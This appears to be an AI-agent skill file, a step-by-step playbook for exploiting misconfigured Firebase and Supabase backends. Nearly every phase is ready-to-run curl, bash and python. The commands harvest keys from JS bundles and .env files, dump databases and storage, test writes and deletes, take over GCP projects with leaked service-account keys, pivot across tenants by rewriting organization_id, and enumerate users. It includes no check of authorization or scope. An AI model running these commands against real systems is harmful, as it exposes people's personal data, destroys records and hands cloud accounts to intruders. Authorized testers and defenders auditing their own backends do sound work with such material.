---
name: Firebase & Supabase BaaS Exploitation
description: Exploit misconfigured Firebase (Firestore, RTDB, Storage, Auth, SA keys) and Supabase (REST/RLS, RPC, Storage, Auth) backends discovered via leaked JS config to dump data and bypass access control.
tags: [cloud, firebase, supabase, baas, rls, misconfig]
recommended_tools: [http_request, http_repeater, curl, python3, jq, katana_crawl, gau_discovery, execute_command]
vuln_classes: [misconfig, idor, auth_bypass, info_disclosure]
domain: cloud
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [recon/firebase-supabase-attack/SKILL.md, redteam/hunt-firebase/SKILL.md, redteam/hunt-supabase/SKILL.md]}
---

# Firebase & Supabase BaaS Exploitation

Firebase and Supabase are Backend-as-a-Service (BaaS) platforms whose access control lives in
server-side rules (Firestore/RTDB Security Rules) or Row Level Security (RLS) policies. Both ship
a **client-side "anon"/API key that is designed to be public** — it is embedded in every JS bundle,
APK, and `.env`. The vulnerability is almost never the key exposure itself; it is missing/permissive
rules that let anyone read, write, or delete data with that public key. This is the #1 source of
mass data breaches in modern SPAs (React/Vue/Angular) and rapid-build stacks (Lovable.dev, Bolt.new,
Cursor), where RLS is consistently left open.

Disclosed real-world results: Brendi (204K WhatsApp conversations, 173K phone numbers, 497 stores,
1,000+ voice files public), Visafy (64K users, 46K reports, DELETE confirmed), Smart Fit (5 Firebase
projects, 21 hardcoded creds, SA keys -> full GCP IAM escalation, 16K storage files), agendadentista
(open signup + auto-confirm, 1,749 leads). CWE-284 (Improper Access Control), CWE-1188 (Insecure
Default), CWE-639 (IDOR via tenant field).

## When to use

- JS bundle / source map analysis reveals a Firebase config (`apiKey: "AIzaSy…"`, `projectId`,
  `authDomain`) or a Supabase URL (`https://<ref>.supabase.co`) + anon key (`eyJhbGci…`).
- Target is a SPA with a BaaS backend, or endpoints reference `firebaseio.com`,
  `firestore.googleapis.com`, `firebasestorage.googleapis.com`, or `*.supabase.co`.
- A source/secret leak turns up `FIREBASE_*`, `SUPABASE_*`, or a `service_account.json`.

## Gate 0 — deterministic proof (what counts as confirmed)

Do not report on key presence alone. A finding is confirmed only when:

- **Firestore/RTDB read**: collections/documents returned **without** an `Authorization` header (or
  with only an anon/anonymous token). Save the row count and sample fields.
- **Supabase read**: HTTP 200 with data rows using only the anon key (no user JWT).
- **Write (either platform)**: at least one INSERT/UPDATE/DELETE returns 2xx and is observable.
- **Auth**: signup returns `idToken` (Firebase) or `access_token` (Supabase).
- **Storage**: object listing/download succeeds unauthenticated.
- **SA key**: `gcloud auth activate-service-account` succeeds and an IAM/resource call returns data.

---

## Phase 1 — Extract the config from client artifacts

Firebase API key format: `AIzaSy[0-9A-Za-z_-]{35}`.
Supabase: URL `https://[a-z0-9-]+\.supabase\.co`, anon key is a JWT starting `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.`.

```bash
TARGET="$1"
OUTDIR="/tmp/baas/$TARGET"; mkdir -p "$OUTDIR"

# Homepage + all referenced JS bundles (katana_crawl / gau_discovery also feed URLs here)
curl -sk "https://$TARGET/" -o "$OUTDIR/index.html"
grep -oP 'src="[^"]*\.js"' "$OUTDIR/index.html" | cut -d'"' -f2 | while read -r js; do
  curl -sk "https://$TARGET${js#https://$TARGET}" -o "$OUTDIR/$(basename "$js")"
done

# Firebase markers
grep -rEno 'AIza[0-9A-Za-z_-]{35}|firebaseConfig|firebase\.initializeApp|authDomain|firebaseio|firestore|firebasestorage|firebaseapp' "$OUTDIR"
# Supabase markers
grep -rEno 'https://[a-z0-9-]+\.supabase\.co|supabaseUrl|SUPABASE_ANON_KEY|eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.\S+' "$OUTDIR"
```

Also mine source maps and exposed config, which often carry the un-minified key/project ID:

```bash
# Source maps -> sourcesContent
curl -sk "https://$TARGET" | grep -oP 'sourceMappingURL=\K[^"]+' | while read -r sm; do
  curl -sk "https://$TARGET/${sm#/}" -o "$OUTDIR/$(basename "$sm")"
done
cat "$OUTDIR"/*.map 2>/dev/null | python3 -c '
import sys,json,re
for src in json.load(sys.stdin).get("sourcesContent",[]) or []:
    if not src: continue
    for k in re.findall(r"AIza[0-9A-Za-z_-]{35}", src): print("FIREBASE_KEY:", k)
    for u in re.findall(r"https://[a-z0-9-]+\.supabase\.co", src): print("SUPABASE_URL:", u)
    for k in re.findall(r"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.\S{50,}", src): print("SUPABASE_KEY:", k)
' 2>/dev/null

# Exposed config / secrets
for f in .env .env.production config.js firebase.json service-account.json manifest.json; do
  curl -sk "https://$TARGET/$f" | grep -iE "FIREBASE|SUPABASE|private_key|service_account" && echo "  ^ from /$f"
done
```

**Pitfall — truncated key.** Minified bundles may split the key across string literals so the regex
returns a partial (`AIzaSy…USd4`). If Firebase calls return "API key not valid", grab 50+ chars of
surrounding context to reconstruct the full literal.

---

## Phase 2 — Firebase: project resolution & service map

Resolve the project ID (encoded in `authDomain: <PROJECT_ID>.firebaseapp.com`), then probe every service.

```bash
API_KEY="AIzaSy..."; PROJECT="your-project-id"

# Anonymous auth (no email needed) — yields an ID token for rule-guarded reads
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" -d '{"returnSecureToken":true}'
# Response: idToken, localId, refreshToken

# Which sign-in methods are enabled
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"test@test.com","continueUri":"http://localhost"}'  # -> allSignInMethods

# Guess project ID when only the key is known
for p in "$TARGET" "${TARGET%.*}" "app-${TARGET%.*}" "${TARGET//./-}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$p.firebaseio.com/.json")
  [ "$code" != "404" ] && echo "Hit: $p.firebaseio.com (HTTP $code)"
done

# Service map
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY"
curl -sk "https://$PROJECT.firebaseio.com/.json"
curl -sk "https://firebasestorage.googleapis.com/v0/b/$PROJECT.appspot.com/o?key=$API_KEY"
curl -skI "https://$PROJECT.firebaseapp.com"    # Hosting
```

**Pitfall — project may be registered but not deployed** (`medxgo-2e637` exists in GCP but has no
Firestore/Storage/Hosting). Probe `firebaseapp.com`, `firebaseio.com`, and `firestore.googleapis.com`
independently; each can differ.

---

## Phase 3 — Firestore exploitation

Firestore Security Rules gate read/write per path. When set to `allow read: if true;` (or an
anonymous token satisfies them) the database is public.

```bash
# Get an anonymous ID token first (many rules require `request.auth != null`, which anon satisfies)
ID_TOKEN=$(curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" -d '{"returnSecureToken":true}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("idToken",""))')

# List root documents / collections
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" | python3 -m json.tool | head -40

# Enumerate every collection id (nested included)
curl -sk -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:listCollectionIds?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" -d '{}'

# Collection-group query to sweep nested collections
curl -sk -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents:runQuery?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" -H "Content-Type: application/json" \
  -d '{"structuredQuery":{"from":[{"collectionId":"users","allDescendants":true}]}}'

# Dump one collection, read one doc
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/$COLLECTION?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"
```

Write/delete are separate rules — test them independently (read-public does not imply write-public):

```bash
curl -sk -X POST "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/probe?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN" -H "Content-Type: application/json" \
  -d '{"fields":{"probe":{"stringValue":"rls-write-test"}}}'   # 200 => write == CRITICAL
curl -sk -X DELETE "https://firestore.googleapis.com/v1/projects/$PROJECT/databases/(default)/documents/probe/DOC_ID?key=$API_KEY" \
  -H "Authorization: Bearer $ID_TOKEN"                          # 200 => delete == CRITICAL
```

Rate-limit note: for large extractions space requests ~0.5–1s to avoid Firestore REST throttling.

---

## Phase 4 — Realtime Database (RTDB)

Different API path; `/.json` returns the entire tree when read rules are open.

```bash
curl -sk "https://$PROJECT.firebaseio.com/.json?print=pretty"        # full dump
curl -sk "https://$PROJECT.firebaseio.com/.json?auth=$ID_TOKEN"      # auth'd read
curl -sk "https://$PROJECT.firebaseio.com/users.json"               # scoped path
curl -sk -X PUT "https://$PROJECT.firebaseio.com/probe.json" -d '{"w":true}'   # write test
curl -sk -X DELETE "https://$PROJECT.firebaseio.com/probe.json"                # delete test
```

---

## Phase 5 — Firebase Storage

```bash
BUCKET="$PROJECT.appspot.com"
# List objects (unauth)
curl -sk "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?key=$API_KEY" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(i["name"],i.get("size")) for i in d.get("items",[])]'
# Download
curl -sk "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o/ENCODED_PATH?alt=media&key=$API_KEY" -o /tmp/f
# Upload (write test)
curl -sk -X POST "https://firebasestorage.googleapis.com/v0/b/$BUCKET/o?name=probe.txt&key=$API_KEY" \
  -H "Content-Type: text/plain" -d "rls-write-test"
```

---

## Phase 6 — Firebase Auth abuse

```bash
# Open email/password signup — if 200 with idToken, anyone can create accounts
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!","returnSecureToken":true}'

# Sign in with obtained/known creds -> idToken -> feed Firestore/RTDB/Storage
curl -sk "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@evil.com","password":"TestPass123!","returnSecureToken":true}'
```

Many apps auto-confirm emails; if signup requires verification, check whether the app confirms
automatically before assuming it is closed.

---

## Phase 7 — Service Account (SA) JSON -> GCP takeover

A leaked `service_account.json` (`"type":"service_account"`, `private_key`, `client_email`) is full
GCP IAM access — the highest-impact Firebase finding.

```bash
gcloud auth activate-service-account --key-file=/tmp/sa-key.json
gcloud projects get-iam-policy "$PROJECT_ID"
gcloud iam service-accounts list
gcloud firestore databases list && gcloud storage buckets list && gcloud functions list
gcloud firestore export gs://$BUCKET/export/     # export the whole database

OAUTH=$(gcloud auth print-access-token)
curl -sk "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents" \
  -H "Authorization: Bearer $OAUTH"
curl -sk -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID:getIamPolicy" \
  -H "Authorization: Bearer $OAUTH" -H "Content-Type: application/json" -d '{}'
```

Smart Fit chain: SA keys granted `storage.admin`, `firebaseappcheck.admin`,
`iam.serviceAccountTokenCreator` -> full GCP control.

---

## Phase 8 — Supabase: recon & schema discovery

```bash
SUPABASE_URL="https://xxxx.supabase.co"; ANON_KEY="eyJ..."

# Verify + try OpenAPI root (sometimes lists the whole schema)
curl -sk "$SUPABASE_URL/rest/v1/" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
```

**Fastest schema map — PostgREST hint leak.** Querying a non-existent table returns a hint naming a
real one:

```bash
for t in users profiles user_profiles customers orders products messages posts comments \
         settings config api_keys tokens sessions accounts transactions payments wallets \
         documents files uploads reports relatorios subscribers; do
  r=$(curl -sk "$SUPABASE_URL/rest/v1/$t?select=*&limit=1" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY")
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$SUPABASE_URL/rest/v1/$t?limit=1" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY")
  hint=$(echo "$r" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("hint",""))' 2>/dev/null)
  [ "$code" = "200" ] && echo "[TABLE] $t (HTTP 200)"
  [ -n "$hint" ] && echo "  hint: $t -> $hint"    # e.g. {"hint":"Perhaps you meant 'public.real_name'"}
done
```

Feed discovered hint names back into the loop until no new tables appear.

---

## Phase 9 — Supabase data extraction & write gap

```bash
TABLE="users"
# Exact row count
curl -skI "$SUPABASE_URL/rest/v1/$TABLE?select=*" -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ANON_KEY" -H "Prefer: count=exact" | grep -i content-range
# Read / paginate / column-select / filter
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?select=*&limit=1000&offset=0" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
curl -sk "$SUPABASE_URL/rest/v1/$TABLE?select=id,email,role&role=eq.admin" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"

# Write gap — test each verb (RLS may protect some tables/verbs and not others)
curl -sk -X POST  "$SUPABASE_URL/rest/v1/$TABLE" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -H "Prefer: return=minimal" -d '{"test_col":"rls-probe"}'
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?id=eq.1" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" -d '{"admin":true}'
curl -sk -X DELETE "$SUPABASE_URL/rest/v1/$TABLE?id=eq.1" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
```

Test **every** table independently — RLS is per-table and per-verb.

---

## Phase 10 — Supabase RLS bypass (IDOR) & RPC abuse

The most common multi-tenant flaw: RLS checks `auth.uid()` matches the row owner but does **not**
check `organization_id` (or `tenant_id`), so you can pivot into another tenant.

```bash
# Cross-organization IDOR via self-UPDATE
curl -sk -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$MY_ID" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT" \
  -H "Content-Type: application/json" -d '{"organization_id":"TARGET_ORG_UUID"}'
# If 200 -> you now inherit the target org's context:
curl -sk "$SUPABASE_URL/rest/v1/projects?organization_id=eq.TARGET_ORG_UUID" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT"
```

RPC functions marked `SECURITY DEFINER` often skip `auth.uid()` filtering and return global data:

```bash
for rpc in get_stats get_dashboard get_analytics get_metrics get_summary get_report; do
  r=$(curl -sk "$SUPABASE_URL/rest/v1/rpc/$rpc" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $USER_JWT" \
        -H "Content-Type: application/json" -d '{}')
  echo "$r" | python3 -c 'import sys,json;json.load(sys.stdin);print("[+] RPC OK")' 2>/dev/null && echo "  $rpc" && echo "$r" | head -c 400
done
```

**Multi-tenant sweep:** the same agency/dev reuses the same broken RLS. WHOIS the target, pull
sibling domains from `crt.sh?q=%25.$TARGET&output=json`, and retest each for Supabase with the same
patterns.

---

## Phase 11 — Supabase Auth & Storage

```bash
# Open signup -> access_token = anyone can register
curl -sk -X POST "$SUPABASE_URL/auth/v1/signup" -H "apikey: $ANON_KEY" \
  -H "Content-Type: application/json" -d '{"email":"test-'$(date +%s)'@evil.com","password":"TestPass123!"}'
# User enumeration: 200 = created, 422 = already exists (valid user), 400 = validation error
for e in admin@$TARGET user@$TARGET support@$TARGET; do
  c=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$SUPABASE_URL/auth/v1/signup" \
      -H "apikey: $ANON_KEY" -H "Content-Type: application/json" -d "{\"email\":\"$e\",\"password\":\"Test123!\"}")
  echo "$e: $c"
done

# Storage
curl -sk "$SUPABASE_URL/storage/v1/bucket"            -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
curl -sk "$SUPABASE_URL/storage/v1/object/list/files" -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY"
curl -sk "$SUPABASE_URL/storage/v1/object/public/files/file.pdf" -o /tmp/dl
curl -sk -X POST "$SUPABASE_URL/storage/v1/object/files/probe.txt" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" -H "Content-Type: text/plain" -d "rls-write-test"
```

---

## Attack chains

- **A (Firebase read):** key in JS -> anonymous `accounts:signUp` -> ID token -> list collections ->
  dump every document -> PII breach.
- **B (Firebase write):** open email/password signup -> authenticated JWT -> write/delete Firestore
  or RTDB documents.
- **C (GCP takeover):** SA JSON in `.env`/repo -> `gcloud auth activate-service-account` -> IAM
  policy + export Firestore + read Storage + invoke Functions.
- **D (Supabase read):** anon key -> hint-based schema map -> RLS-disabled tables -> dump PII.
- **E (Supabase cross-tenant):** self-UPDATE `organization_id` -> RLS misses tenant check -> read the
  target org's rows.
- **F (Supabase RPC leak):** `SECURITY DEFINER` RPC without `auth.uid()` filter -> global aggregate
  data from all tenants.

## Severity guide

| Finding | Severity |
|---|---|
| Firestore/RTDB/Supabase public read of PII | Critical |
| Public write/delete (any of the above) | Critical |
| Supabase RLS bypass via org_id / storage public upload | Critical |
| Service Account JSON exposed | Critical |
| Open signup, RPC cross-org data, storage public list/download | High |
| Email enumeration via signup | Low-Medium |
| API key / project ID only, no further access | Informational |
